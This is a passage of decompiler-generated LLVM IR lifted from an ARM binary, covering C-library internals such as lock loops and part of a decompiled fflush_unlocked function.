  br i1 %v2_16c88, label %dec_label_pc_16c94, label %dec_label_pc_16c4c

dec_label_pc_16c94:                               ; preds = %dec_label_pc_16c84, %dec_label_pc_16c20
  store i32 152, i32* %r3.global-to-local, align 4
  %v0_16c98 = load i32, i32* %r5.global-to-local, align 4
  %v2_16c98 = add i32 %v0_16c98, 152
  %v3_16c98 = inttoptr i32 %v2_16c98 to i32*
  %v4_16c98 = load i32, i32* %v3_16c98, align 4
  store i32 %v4_16c98, i32* %r0.global-to-local, align 4
  %v1_16c9c = add i32 %v4_16c98, 4
  %v2_16c9c = inttoptr i32 %v1_16c9c to i32*
  %v3_16c9c = load i32, i32* %v2_16c9c, align 4
  %v1_16ca0 = add i32 %v3_16c9c, -1
  store i32 %v1_16ca0, i32* %r3.global-to-local, align 4
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  %v2_16ca4 = icmp eq i32 %v1_16ca0, 0
  store i32 %v1_16ca0, i32* %v2_16c9c, align 4
  br i1 %v2_16ca4, label %dec_label_pc_16cb0, label %dec_label_pc_16d10

dec_label_pc_16cb0:                               ; preds = %dec_label_pc_16c94
  %v0_16cb0 = load i32, i32* %r3.global-to-local, align 4
  %v1_16cb0 = load i32, i32* %r0.global-to-local, align 4
  %v2_16cb0 = add i32 %v1_16cb0, 8
  %v3_16cb0 = inttoptr i32 %v2_16cb0 to i32*
  store i32 %v0_16cb0, i32* %v3_16cb0, align 4
  %v0_16cb4 = load i32, i32* %r0.global-to-local, align 4
  store i32 %v0_16cb4, i32* %r7.global-to-local, align 4
  br label %dec_label_pc_16cb8

dec_label_pc_16cb8:                               ; preds = %dec_label_pc_16ce8.dec_label_pc_16cb8_crit_edge, %dec_label_pc_16cb0
  %v0_16cb8 = phi i32 [ %v0_16cb8.pre, %dec_label_pc_16ce8.dec_label_pc_16cb8_crit_edge ], [ %v0_16cb4, %dec_label_pc_16cb0 ]
  %v1_16cb8 = inttoptr i32 %v0_16cb8 to i32*
  %v2_16cb8 = load i32, i32* %v1_16cb8, align 4
  store i32 %v2_16cb8, i32* %r4.global-to-local, align 4
  store i32 0, i32* %r1.global-to-local, align 4
  store i32 %v0_16cb8, i32* %r2.global-to-local, align 4
  %v2_16cc474 = load i32, i32* %v1_16cb8, align 4
  store i32 %v2_16cc474, i32* %r3.global-to-local, align 4
  %v3_16cc876 = icmp uge i32 %v2_16cc474, %v2_16cb8
  store i1 %v3_16cc876, i1* %cpsr_c.global-to-local, align 1
  %v9_16cc882 = icmp eq i32 %v2_16cc474, %v2_16cb8
  br i1 %v9_16cc882, label %dec_label_pc_16cd0, label %dec_label_pc_16ce8

dec_label_pc_16cd0:                               ; preds = %dec_label_pc_16cb8, %dec_label_pc_16cd0.dec_label_pc_16cc4_crit_edge
  %v0_16cd083 = phi i32 [ %v1_16cc8.pre, %dec_label_pc_16cd0.dec_label_pc_16cc4_crit_edge ], [ %v2_16cb8, %dec_label_pc_16cb8 ]
  store i32 %v0_16cd083, i32* %r0.global-to-local, align 4
  store i32 -61441, i32* %r3.global-to-local, align 4
  call void @__pseudo_branch(i32 -61504)
  %v0_16ce0 = load i1, i1* %cpsr_c.global-to-local, align 1
  br i1 %v0_16ce0, label %dec_label_pc_16ce4, label %dec_label_pc_16cd0.dec_label_pc_16cc4_crit_edge

dec_label_pc_16cd0.dec_label_pc_16cc4_crit_edge:  ; preds = %dec_label_pc_16cd0
  %v0_16cc4.pre = load i32, i32* %r2.global-to-local, align 4
  %v1_16cc8.pre = load i32, i32* %r4.global-to-local, align 4
  %v1_16cc4 = inttoptr i32 %v0_16cc4.pre to i32*
  %v2_16cc4 = load i32, i32* %v1_16cc4, align 4
  store i32 %v2_16cc4, i32* %r3.global-to-local, align 4
  %v3_16cc8 = icmp uge i32 %v2_16cc4, %v1_16cc8.pre
  store i1 %v3_16cc8, i1* %cpsr_c.global-to-local, align 1
  %v9_16cc8 = icmp eq i32 %v2_16cc4, %v1_16cc8.pre
  br i1 %v9_16cc8, label %dec_label_pc_16cd0, label %dec_label_pc_16ce8

dec_label_pc_16ce4:                               ; preds = %dec_label_pc_16cd0
  %v0_16ce4 = load i32, i32* %r4.global-to-local, align 4
  store i32 %v0_16ce4, i32* %r3.global-to-local, align 4
  br label %dec_label_pc_16ce8

dec_label_pc_16ce8:                               ; preds = %dec_label_pc_16cb8, %dec_label_pc_16cd0.dec_label_pc_16cc4_crit_edge, %dec_label_pc_16ce4
  %v0_16cf0 = phi i32 [ %v0_16ce4, %dec_label_pc_16ce4 ], [ %v2_16cc474, %dec_label_pc_16cb8 ], [ %v2_16cc4, %dec_label_pc_16cd0.dec_label_pc_16cc4_crit_edge ]
  %v1_16ce8 = phi i32 [ %v0_16ce4, %dec_label_pc_16ce4 ], [ %v2_16cb8, %dec_label_pc_16cb8 ], [ %v1_16cc8.pre, %dec_label_pc_16cd0.dec_label_pc_16cc4_crit_edge ]
  %v3_16ce8 = icmp uge i32 %v0_16cf0, %v1_16ce8
  store i1 %v3_16ce8, i1* %cpsr_c.global-to-local, align 1
  %v9_16ce8 = icmp eq i32 %v0_16cf0, %v1_16ce8
  br i1 %v9_16ce8, label %dec_label_pc_16cf0, label %dec_label_pc_16ce8.dec_label_pc_16cb8_crit_edge

dec_label_pc_16ce8.dec_label_pc_16cb8_crit_edge:  ; preds = %dec_label_pc_16ce8
  %v0_16cb8.pre = load i32, i32* %r7.global-to-local, align 4
  br label %dec_label_pc_16cb8

dec_label_pc_16cf0:                               ; preds = %dec_label_pc_16ce8
  %v2_16cf0 = icmp ne i32 %v1_16ce8, 0
  store i1 %v2_16cf0, i1* %cpsr_c.global-to-local, align 1
  %v7_16cf4 = icmp slt i32 %v1_16ce8, 2
  br i1 %v7_16cf4, label %dec_label_pc_16d10, label %dec_label_pc_16cf8

dec_label_pc_16cf8:                               ; preds = %dec_label_pc_16cf0
  %v0_16cf8 = load i32, i32* %r7.global-to-local, align 4
  store i32 %v0_16cf8, i32* %r0.global-to-local, align 4
  %v0_16cfc = load i32, i32* %r1.global-to-local, align 4
  %v1_16cfc = add i32 %v0_16cfc, 129
  store i32 %v1_16cfc, i32* %r1.global-to-local, align 4
  store i32 1, i32* %r2.global-to-local, align 4
  store i32 0, i32* %r3.global-to-local, align 4
  store i32 240, i32* %r7.global-to-local, align 4
  br label %dec_label_pc_16d10

dec_label_pc_16d10:                               ; preds = %dec_label_pc_16c94, %dec_label_pc_16cf8, %dec_label_pc_16cf0
  store i32 80, i32* %r3.global-to-local, align 4
  %v0_16d14 = load i32, i32* %r5.global-to-local, align 4
  %v2_16d14 = add i32 %v0_16d14, 80
  %v3_16d14 = inttoptr i32 %v2_16d14 to i32*
  %v4_16d14 = load i32, i32* %v3_16d14, align 4
  store i32 %v4_16d14, i32* %r2.global-to-local, align 4
  store i32 0, i32* %r3.global-to-local, align 4
  %v2_16d1c = inttoptr i32 %v4_16d14 to i32*
  store i32 0, i32* %v2_16d1c, align 4
  br label %dec_label_pc_16d20

dec_label_pc_16d20:                               ; preds = %dec_label_pc_16b94, %dec_label_pc_16bbc, %dec_label_pc_16d10
  store i32 160, i32* %r3.global-to-local, align 4
  %v0_16d24 = load i32, i32* %r5.global-to-local, align 4
  %v2_16d24 = add i32 %v0_16d24, 160
  %v3_16d24 = inttoptr i32 %v2_16d24 to i32*
  %v4_16d24 = load i32, i32* %v3_16d24, align 4
  store i32 %v4_16d24, i32* %r0.global-to-local, align 4
  store i32 12, i32* %r3.global-to-local, align 4
  %v2_16d2c = add i32 %v0_16d24, 12
  %v3_16d2c = inttoptr i32 %v2_16d2c to i32*
  %v4_16d2c = load i32, i32* %v3_16d2c, align 4
  store i32 %v4_16d2c, i32* %r1.global-to-local, align 4
  %v1_16d30 = add i32 %v4_16d24, 4
  %v2_16d30 = inttoptr i32 %v1_16d30 to i32*
  %v3_16d30 = load i32, i32* %v2_16d30, align 4
  store i32 %v3_16d30, i32* %r2.global-to-local, align 4
  %v1_16d34 = inttoptr i32 %v4_16d2c to i32*
  %v2_16d34 = load i32, i32* %v1_16d34, align 4
  %v1_16d38 = add i32 %v3_16d30, -1
  store i32 %v1_16d38, i32* %r2.global-to-local, align 4
  %v1_16d3c = add i32 %v2_16d34, -1
  store i32 %v1_16d3c, i32* %r3.global-to-local, align 4
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  %v2_16d40 = icmp eq i32 %v1_16d38, 0
  store i32 %v1_16d3c, i32* %v1_16d34, align 4
  %v0_16d48 = load i32, i32* %r2.global-to-local, align 4
  %v1_16d48 = load i32, i32* %r0.global-to-local, align 4
  %v2_16d48 = add i32 %v1_16d48, 4
  %v3_16d48 = inttoptr i32 %v2_16d48 to i32*
  store i32 %v0_16d48, i32* %v3_16d48, align 4
  br i1 %v2_16d40, label %dec_label_pc_16d50, label %dec_label_pc_16db0

dec_label_pc_16d50:                               ; preds = %dec_label_pc_16d20
  %v0_16d50 = load i32, i32* %r2.global-to-local, align 4
  %v1_16d50 = load i32, i32* %r0.global-to-local, align 4
  %v2_16d50 = add i32 %v1_16d50, 8
  %v3_16d50 = inttoptr i32 %v2_16d50 to i32*
  store i32 %v0_16d50, i32* %v3_16d50, align 4
  %v0_16d54 = load i32, i32* %r0.global-to-local, align 4
  store i32 %v0_16d54, i32* %r7.global-to-local, align 4
  br label %dec_label_pc_16d58

dec_label_pc_16d58:                               ; preds = %dec_label_pc_16d88.dec_label_pc_16d58_crit_edge, %dec_label_pc_16d50
  %v0_16d58 = phi i32 [ %v0_16d58.pre, %dec_label_pc_16d88.dec_label_pc_16d58_crit_edge ], [ %v0_16d54, %dec_label_pc_16d50 ]
  %v1_16d58 = inttoptr i32 %v0_16d58 to i32*
  %v2_16d58 = load i32, i32* %v1_16d58, align 4
  store i32 %v2_16d58, i32* %r4.global-to-local, align 4
  store i32 0, i32* %r1.global-to-local, align 4
  store i32 %v0_16d58, i32* %r2.global-to-local, align 4
  %v2_16d6462 = load i32, i32* %v1_16d58, align 4
  store i32 %v2_16d6462, i32* %r3.global-to-local, align 4
  %v3_16d6864 = icmp uge i32 %v2_16d6462, %v2_16d58
  store i1 %v3_16d6864, i1* %cpsr_c.global-to-local, align 1
  %v9_16d6870 = icmp eq i32 %v2_16d6462, %v2_16d58
  br i1 %v9_16d6870, label %dec_label_pc_16d70, label %dec_label_pc_16d88

dec_label_pc_16d70:                               ; preds = %dec_label_pc_16d58, %dec_label_pc_16d70.dec_label_pc_16d64_crit_edge
  %v0_16d7071 = phi i32 [ %v1_16d68.pre, %dec_label_pc_16d70.dec_label_pc_16d64_crit_edge ], [ %v2_16d58, %dec_label_pc_16d58 ]
  store i32 %v0_16d7071, i32* %r0.global-to-local, align 4
  store i32 -61441, i32* %r3.global-to-local, align 4
  call void @__pseudo_branch(i32 -61504)
  %v0_16d80 = load i1, i1* %cpsr_c.global-to-local, align 1
  br i1 %v0_16d80, label %dec_label_pc_16d84, label %dec_label_pc_16d70.dec_label_pc_16d64_crit_edge

dec_label_pc_16d70.dec_label_pc_16d64_crit_edge:  ; preds = %dec_label_pc_16d70
  %v0_16d64.pre = load i32, i32* %r2.global-to-local, align 4
  %v1_16d68.pre = load i32, i32* %r4.global-to-local, align 4
  %v1_16d64 = inttoptr i32 %v0_16d64.pre to i32*
  %v2_16d64 = load i32, i32* %v1_16d64, align 4
  store i32 %v2_16d64, i32* %r3.global-to-local, align 4
  %v3_16d68 = icmp uge i32 %v2_16d64, %v1_16d68.pre
  store i1 %v3_16d68, i1* %cpsr_c.global-to-local, align 1
  %v9_16d68 = icmp eq i32 %v2_16d64, %v1_16d68.pre
  br i1 %v9_16d68, label %dec_label_pc_16d70, label %dec_label_pc_16d88

dec_label_pc_16d84:                               ; preds = %dec_label_pc_16d70
  %v0_16d84 = load i32, i32* %r4.global-to-local, align 4
  store i32 %v0_16d84, i32* %r3.global-to-local, align 4
  br label %dec_label_pc_16d88

dec_label_pc_16d88:                               ; preds = %dec_label_pc_16d58, %dec_label_pc_16d70.dec_label_pc_16d64_crit_edge, %dec_label_pc_16d84
  %v0_16d90 = phi i32 [ %v0_16d84, %dec_label_pc_16d84 ], [ %v2_16d6462, %dec_label_pc_16d58 ], [ %v2_16d64, %dec_label_pc_16d70.dec_label_pc_16d64_crit_edge ]
  %v1_16d88 = phi i32 [ %v0_16d84, %dec_label_pc_16d84 ], [ %v2_16d58, %dec_label_pc_16d58 ], [ %v1_16d68.pre, %dec_label_pc_16d70.dec_label_pc_16d64_crit_edge ]
  %v3_16d88 = icmp uge i32 %v0_16d90, %v1_16d88
  store i1 %v3_16d88, i1* %cpsr_c.global-to-local, align 1
  %v9_16d88 = icmp eq i32 %v0_16d90, %v1_16d88
  br i1 %v9_16d88, label %dec_label_pc_16d90, label %dec_label_pc_16d88.dec_label_pc_16d58_crit_edge

dec_label_pc_16d88.dec_label_pc_16d58_crit_edge:  ; preds = %dec_label_pc_16d88
  %v0_16d58.pre = load i32, i32* %r7.global-to-local, align 4
  br label %dec_label_pc_16d58

dec_label_pc_16d90:                               ; preds = %dec_label_pc_16d88
  %v2_16d90 = icmp ne i32 %v1_16d88, 0
  store i1 %v2_16d90, i1* %cpsr_c.global-to-local, align 1
  %v7_16d94 = icmp slt i32 %v1_16d88, 2
  br i1 %v7_16d94, label %dec_label_pc_16db0, label %dec_label_pc_16d98

dec_label_pc_16d98:                               ; preds = %dec_label_pc_16d90
  %v0_16d98 = load i32, i32* %r7.global-to-local, align 4
  store i32 %v0_16d98, i32* %r0.global-to-local, align 4
  %v0_16d9c = load i32, i32* %r1.global-to-local, align 4
  %v1_16d9c = add i32 %v0_16d9c, 129
  store i32 %v1_16d9c, i32* %r1.global-to-local, align 4
  store i32 1, i32* %r2.global-to-local, align 4
  store i32 0, i32* %r3.global-to-local, align 4
  store i32 240, i32* %r7.global-to-local, align 4
  br label %dec_label_pc_16db0

dec_label_pc_16db0:                               ; preds = %dec_label_pc_16d20, %dec_label_pc_16d98, %dec_label_pc_16d90
  %v2_16db4 = load i32, i32* %stack_var_-20, align 4
  store i32 %v2_16db4, i32* %r4.global-to-local, align 4
  %v1_16db8 = load i32, i32* %r0.global-to-local, align 4
  ret i32 %v1_16db8

; uselistorder directives
  uselistorder i32 %v0_16d84, { 1, 0, 2 }
  uselistorder i32 %v1_16d68.pre, { 0, 3, 2, 1 }
  uselistorder i32 %v0_16d58, { 1, 0 }
  uselistorder i32 %v0_16ce4, { 1, 0, 2 }
  uselistorder i32 %v1_16cc8.pre, { 0, 3, 2, 1 }
  uselistorder i32 %v0_16cb8, { 1, 0 }
  uselistorder i32 %v0_16c84, { 2, 1, 0 }
  uselistorder i32 %v0_16c28, { 1, 0 }
  uselistorder i32 %v0_16c0c, { 1, 0, 2 }
  uselistorder i32 %v1_16bf0.pre, { 0, 3, 2, 1 }
  uselistorder i32 %v1_16bdc, { 1, 0 }
  uselistorder i32 %v0_16b80, { 1, 0, 2 }
  uselistorder i32 %v1_16b64.pre, { 0, 3, 2, 1 }
  uselistorder i32 %v4_16b38, { 2, 1, 0, 3 }
  uselistorder i32* %r7.global-to-local, { 0, 1, 2, 3, 4, 6, 5, 7, 8, 9, 11, 10, 12, 14, 13, 15 }
  uselistorder i32* %r6.global-to-local, { 5, 6, 0, 1, 2, 3, 4 }
  uselistorder i32* %r5.global-to-local, { 0, 1, 2, 3, 6, 4, 5, 7 }
  uselistorder i32* %r4.global-to-local, { 0, 1, 2, 3, 5, 4, 6, 7, 8, 10, 9, 11, 12, 13, 14 }
  uselistorder i32* %r3.global-to-local, { 4, 5, 7, 6, 0, 8, 9, 10, 11, 12, 13, 14, 16, 15, 3, 17, 18, 19, 43, 44, 20, 21, 22, 23, 24, 25, 26, 28, 27, 2, 29, 30, 31, 32, 33, 34, 35, 36, 37, 38, 40, 39, 1, 41, 42 }
  uselistorder i32* %r2.global-to-local, { 0, 1, 2, 4, 3, 5, 6, 7, 8, 9, 10, 11, 12, 13, 14, 15, 16, 17, 18, 19, 20, 21 }
  uselistorder i32* %r1.global-to-local, { 1, 2, 3, 4, 5, 6, 7, 9, 8, 0, 10, 11, 12 }
  uselistorder i32* %r0.global-to-local, { 2, 0, 1, 3, 5, 4, 6, 7, 8, 9, 10, 11, 12, 13, 14, 15, 16, 17, 18 }
  uselistorder i1* %cpsr_c.global-to-local, { 4, 5, 7, 6, 2, 8, 9, 10, 12, 11, 0, 13, 16, 14, 15, 3, 17, 18, 26, 27, 19, 20, 21, 22, 24, 23, 1, 25 }
  uselistorder i32 8192, { 3, 0, 1, 2 }
  uselistorder i32 47, { 2, 0, 5, 3, 4, 1 }
  uselistorder i32 32816, { 2, 0, 1 }
  uselistorder label %dec_label_pc_16db0, { 1, 2, 0 }
  uselistorder label %dec_label_pc_16d88, { 2, 1, 0 }
  uselistorder label %dec_label_pc_16d70, { 1, 0 }
  uselistorder label %dec_label_pc_16d20, { 2, 1, 0 }
  uselistorder label %dec_label_pc_16d10, { 1, 2, 0 }
  uselistorder label %dec_label_pc_16ce8, { 2, 1, 0 }
  uselistorder label %dec_label_pc_16cd0, { 1, 0 }
  uselistorder label %dec_label_pc_16c84, { 1, 0 }
  uselistorder label %bb52, { 1, 0 }
  uselistorder label %bb50, { 1, 0 }
  uselistorder label %dec_label_pc_16c4c, { 1, 0 }
  uselistorder label %dec_label_pc_16c20, { 1, 0 }
  uselistorder label %bb48, { 1, 0 }
  uselistorder label %dec_label_pc_16c10, { 2, 1, 0 }
  uselistorder label %dec_label_pc_16bf8, { 1, 0 }
  uselistorder label %dec_label_pc_16b94, { 1, 0 }
  uselistorder label %bb45, { 1, 0 }
  uselistorder label %dec_label_pc_16b84, { 2, 1, 0 }
  uselistorder label %dec_label_pc_16b6c, { 1, 0 }
}

define i32 @function_16dc0(i32 %arg1) local_unnamed_addr {
dec_label_pc_16dc0:
  %v0_16dc0 = load i1, i1* @cpsr_z, align 1
  br i1 %v0_16dc0, label %bb, label %.thread4

bb:                                               ; preds = %dec_label_pc_16dc0
  br label %.thread4

.thread4:                                         ; preds = %dec_label_pc_16dc0, %bb
  %v10_16dd4 = phi i32 [ %arg1, %dec_label_pc_16dc0 ], [ 0, %bb ]
  ret i32 %v10_16dd4

; uselistorder directives
  uselistorder label %.thread4, { 1, 0 }
}

define i32 @fflush_unlocked(i16* %arg1) local_unnamed_addr {
entry:
  %cpsr_c.global-to-local = alloca i1, align 1
  %fp.global-to-local = alloca i32, align 4
  %r0.global-to-local = alloca i32, align 4
  %r1.global-to-local = alloca i32, align 4
  %r2.global-to-local = alloca i32, align 4
  %r3.global-to-local = alloca i32, align 4
  %r5.global-to-local = alloca i32, align 4
  %r8.global-to-local = alloca i32, align 4
  %sb.global-to-local = alloca i32, align 4
  %sl.global-to-local = alloca i32, align 4
  %tmp = ptrtoint i16* %arg1 to i32
  store i32 %tmp, i32* %r0.global-to-local, align 4
  %v6_16dd8 = load i32, i32* @r5, align 4
  store i32 76, i32* %r3.global-to-local, align 4
  store i32 ptrtoint (i32* @global_var_221d4.362 to i32), i32* @r6, align 4
  %v4_16de8 = load i32, i32* inttoptr (i32 add (i32 ptrtoint (i32* @global_var_221d4.362 to i32), i32 76) to i32*), align 4
  store i32 %v4_16de8, i32* %r3.global-to-local, align 4
  %v4_16dec = icmp uge i32 %tmp, %v4_16de8
  store i1 %v4_16dec, i1* %cpsr_c.global-to-local, align 1
  %v10_16dec = icmp eq i32 %tmp, %v4_16de8
  br i1 %v10_16dec, label %bb, label %dec_label_pc_16e04

bb:                                               ; preds = %entry
  store i32 0, i32* %r2.global-to-local, align 4
  store i32 %tmp, i32* @r4, align 4
  br label %dec_label_pc_16e14

dec_label_pc_16e04:                               ; preds = %entry
  store i32 %tmp, i32* @r4, align 4
  store i32 256, i32* %r3.global-to-local, align 4
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  %v3_16e08 = icmp eq i16* %arg1, null
  br i1 %v3_16e08, label %dec_label_pc_16e14, label %dec_label_pc_17128

dec_label_pc_16e14:                               ; preds = %bb, %dec_label_pc_16e04
  %stack_var_-44.1 = phi i32 [ 0, %bb ], [ 256, %dec_label_pc_16e04 ]
  store i32 160, i32* %r3.global-to-local, align 4
  %v4_16e18 = load i32, i32* inttoptr (i32 add (i32 ptrtoint (i32* @global_var_221d4.362 to i32), i32 160) to i32*), align 4
  store i32 %v4_16e18, i32* %r5.global-to-local, align 4
  %v0_16e1c = call i32 @__aeabi_read_tp()
  store i32 %v0_16e1c, i32* %r0.global-to-local, align 4
  %v1_16e20 = add i32 %v4_16e18, 8
  %v2_16e20 = inttoptr i32 %v1_16e20 to i32*
  %v3_16e20 = load i32, i32* %v2_16e20, align 4
  store i32 %v3_16e20, i32* %r3.global-to-local, align 4
  %v1_16e24 = add i32 %v0_16e1c, -1168
  store i32 %v1_16e24, i32* %r8.global-to-local, align 4
  %v3_16e28 = icmp uge i32 %v3_16e20, %v1_16e24
  store i1 %v3_16e28, i1* %cpsr_c.global-to-local, align 1
  %v9_16e28 = icmp eq i32 %v3_16e20, %v1_16e24
  br i1 %v9_16e28, label %dec_label_pc_16e70, label %dec_label_pc_16e30

dec_label_pc_16e30:                               ; preds = %dec_label_pc_16e14
  store i32 1, i32* %r1.global-to-local, align 4
  store i32 %v4_16e18, i32* %r2.global-to-local, align 4
  store i32 0, i32* @r4, align 4
  %v1_16e3c143 = inttoptr i32 %v4_16e18 to i32*
  %v2_16e3c144 = load i32, i32* %v1_16e3c143, align 4
  store i32 %v2_16e3c144, i32* %r3.global-to-local, align 4
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  %v9_16e40146 = icmp eq i32 %v2_16e3c144, 0
  br i1 %v9_16e40146, label %dec_label_pc_16e48, label %dec_label_pc_16e60

dec_label_pc_16e48:                               ; preds = %dec_label_pc_16e30, %dec_label_pc_16e48.dec_label_pc_16e3c_crit_edge
  %v0_16e48147 = phi i32 [ %v1_16e40.pre, %dec_label_pc_16e48.dec_label_pc_16e3c_crit_edge ], [ 0, %dec_label_pc_16e30 ]
  store i32 %v0_16e48147, i32* %r0.global-to-local, align 4
  store i32 -61441, i32* %r3.global-to-local, align 4
  call void @__pseudo_branch(i32 -61504)
  %v0_16e58 = load i1, i1* %cpsr_c.global-to-local, align 1
  br i1 %v0_16e58, label %dec_label_pc_16e5c, label %dec_label_pc_16e48.dec_label_pc_16e3c_crit_edge

dec_label_pc_16e48.dec_label_pc_16e3c_crit_edge:  ; preds = %dec_label_pc_16e48
  %v0_16e3c.pre = load i32, i32* %r2.global-to-local, align 4
  %v1_16e40.pre = load i32, i32* @r4, align 4
  %v1_16e3c = inttoptr i32 %v0_16e3c.pre to i32*
  %v2_16e3c = load i32, i32* %v1_16e3c, align 4
  store i32 %v2_16e3c, i32* %r3.global-to-local, align 4
  %v3_16e40 = icmp uge i32 %v2_16e3c, %v1_16e40.pre
  store i1 %v3_16e40, i1* %cpsr_c.global-to-local, align 1
  %v9_16e40 = icmp eq i32 %v2_16e3c, %v1_16e40.pre
  br i1 %v9_16e40, label %dec_label_pc_16e48, label %dec_label_pc_16e60

dec_label_pc_16e5c:                               ; preds = %dec_label_pc_16e48
  %v0_16e5c = load i32, i32* @r4, align 4
  store i32 %v0_16e5c, i32* %r3.global-to-local, align 4
  br label %dec_label_pc_16e60

dec_label_pc_16e60:                               ; preds = %dec_label_pc_16e30, %dec_label_pc_16e48.dec_label_pc_16e3c_crit_edge, %dec_label_pc_16e5c
  %v0_16e60 = phi i32 [ %v0_16e5c, %dec_label_pc_16e5c ], [ %v2_16e3c144, %dec_label_pc_16e30 ], [ %v2_16e3c, %dec_label_pc_16e48.dec_label_pc_16e3c_crit_edge ]
  %v1_16e60 = phi i32 [ %v0_16e5c, %dec_label_pc_16e5c ], [ 0, %dec_label_pc_16e30 ], [ %v1_16e40.pre, %dec_label_pc_16e48.dec_label_pc_16e3c_crit_edge ]
  %v3_16e60 = icmp uge i32 %v0_16e60, %v1_16e60
  store i1 %v3_16e60, i1* %cpsr_c.global-to-local, align 1
  %v9_16e60 = icmp eq i32 %v0_16e60, %v1_16e60
  br i1 %v9_16e60, label %bb66, label %bb65

bb65:                                             ; preds = %dec_label_pc_16e60
  %v1_16e64 = load i32, i32* %r5.global-to-local, align 4
  store i32 %v1_16e64, i32* %r0.global-to-local, align 4
  br label %bb66

bb66:                                             ; preds = %dec_label_pc_16e60, %bb65
  %v1_16e68 = xor i1 %v9_16e60, true
  call void @__pseudo_cond_branch(i1 %v1_16e68, i32 ptrtoint (i32* @global_var_14734.518 to i32))
  %v0_16e6c = load i32, i32* %r8.global-to-local, align 4
  %v1_16e6c = load i32, i32* %r5.global-to-local, align 4
  %v2_16e6c = add i32 %v1_16e6c, 8
  %v3_16e6c = inttoptr i32 %v2_16e6c to i32*
  store i32 %v0_16e6c, i32* %v3_16e6c, align 4
  br label %dec_label_pc_16e70

dec_label_pc_16e70:                               ; preds = %dec_label_pc_16e14, %bb66
  store i32 160, i32* %r3.global-to-local, align 4
  %v0_16e74 = load i32, i32* @r6, align 4
  %v2_16e74 = add i32 %v0_16e74, 160
  %v3_16e74 = inttoptr i32 %v2_16e74 to i32*
  %v4_16e74 = load i32, i32* %v3_16e74, align 4
  store i32 %v4_16e74, i32* %r0.global-to-local, align 4
  store i32 12, i32* %r3.global-to-local, align 4
  %v2_16e7c = add i32 %v0_16e74, 12
  %v3_16e7c = inttoptr i32 %v2_16e7c to i32*
  %v4_16e7c = load i32, i32* %v3_16e7c, align 4
  store i32 %v4_16e7c, i32* %r2.global-to-local, align 4
  %v1_16e80 = add i32 %v4_16e74, 4
  %v2_16e80 = inttoptr i32 %v1_16e80 to i32*
  %v3_16e80 = load i32, i32* %v2_16e80, align 4
  store i32 %v3_16e80, i32* %r1.global-to-local, align 4
  %v1_16e84 = inttoptr i32 %v4_16e7c to i32*
  %v2_16e84 = load i32, i32* %v1_16e84, align 4
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  %v2_16e88 = icmp eq i32 %v3_16e80, 0
  %v1_16e8c = add i32 %v2_16e84, 1
  store i32 %v1_16e8c, i32* %r3.global-to-local, align 4
  store i32 %v1_16e8c, i32* %v1_16e84, align 4
  br i1 %v2_16e88, label %dec_label_pc_16e98, label %dec_label_pc_16ef8

dec_label_pc_16e98:                               ; preds = %dec_label_pc_16e70
  %v0_16e98 = load i32, i32* %r1.global-to-local, align 4
  %v1_16e98 = load i32, i32* %r0.global-to-local, align 4
  %v2_16e98 = add i32 %v1_16e98, 8
  %v3_16e98 = inttoptr i32 %v2_16e98 to i32*
  store i32 %v0_16e98, i32* %v3_16e98, align 4
  %v0_16e9c = load i32, i32* %r0.global-to-local, align 4
  store i32 %v0_16e9c, i32* %r5.global-to-local, align 4
  br label %dec_label_pc_16ea0

dec_label_pc_16ea0:                               ; preds = %dec_label_pc_16ed0.dec_label_pc_16ea0_crit_edge, %dec_label_pc_16e98
  %v0_16ea0 = phi i32 [ %v0_16ea0.pre, %dec_label_pc_16ed0.dec_label_pc_16ea0_crit_edge ], [ %v0_16e9c, %dec_label_pc_16e98 ]
  %v1_16ea0 = inttoptr i32 %v0_16ea0 to i32*
  %v2_16ea0 = load i32, i32* %v1_16ea0, align 4
  store i32 %v2_16ea0, i32* @r4, align 4
  store i32 0, i32* %r1.global-to-local, align 4
  store i32 %v0_16ea0, i32* %r2.global-to-local, align 4
  %v2_16eac131 = load i32, i32* %v1_16ea0, align 4
  store i32 %v2_16eac131, i32* %r3.global-to-local, align 4
  %v3_16eb0133 = icmp uge i32 %v2_16eac131, %v2_16ea0
  store i1 %v3_16eb0133, i1* %cpsr_c.global-to-local, align 1
  %v9_16eb0139 = icmp eq i32 %v2_16eac131, %v2_16ea0
  br i1 %v9_16eb0139, label %dec_label_pc_16eb8, label %dec_label_pc_16ed0

dec_label_pc_16eb8:                               ; preds = %dec_label_pc_16ea0, %dec_label_pc_16eb8.dec_label_pc_16eac_crit_edge
  %v0_16eb8140 = phi i32 [ %v1_16eb0.pre, %dec_label_pc_16eb8.dec_label_pc_16eac_crit_edge ], [ %v2_16ea0, %dec_label_pc_16ea0 ]
  store i32 %v0_16eb8140, i32* %r0.global-to-local, align 4
  store i32 -61441, i32* %r3.global-to-local, align 4
  call void @__pseudo_branch(i32 -61504)
  %v0_16ec8 = load i1, i1* %cpsr_c.global-to-local, align 1
  br i1 %v0_16ec8, label %dec_label_pc_16ecc, label %dec_label_pc_16eb8.dec_label_pc_16eac_crit_edge

dec_label_pc_16eb8.dec_label_pc_16eac_crit_edge:  ; preds = %dec_label_pc_16eb8
  %v0_16eac.pre = load i32, i32* %r2.global-to-local, align 4
  %v1_16eb0.pre = load i32, i32* @r4, align 4
  %v1_16eac = inttoptr i32 %v0_16eac.pre to i32*
  %v2_16eac = load i32, i32* %v1_16eac, align 4
  store i32 %v2_16eac, i32* %r3.global-to-local, align 4
  %v3_16eb0 = icmp uge i32 %v2_16eac, %v1_16eb0.pre
  store i1 %v3_16eb0, i1* %cpsr_c.global-to-local, align 1
  %v9_16eb0 = icmp eq i32 %v2_16eac, %v1_16eb0.pre
  br i1 %v9_16eb0, label %dec_label_pc_16eb8, label %dec_label_pc_16ed0

dec_label_pc_16ecc:                               ; preds = %dec_label_pc_16eb8
  %v0_16ecc = load i32, i32* @r4, align 4
  store i32 %v0_16ecc, i32* %r3.global-to-local, align 4
  br label %dec_label_pc_16ed0

dec_label_pc_16ed0:                               ; preds = %dec_label_pc_16ea0, %dec_label_pc_16eb8.dec_label_pc_16eac_crit_edge, %dec_label_pc_16ecc
  %v0_16ed8 = phi i32 [ %v0_16ecc, %dec_label_pc_16ecc ], [ %v2_16eac131, %dec_label_pc_16ea0 ], [ %v2_16eac, %dec_label_pc_16eb8.dec_label_pc_16eac_crit_edge ]
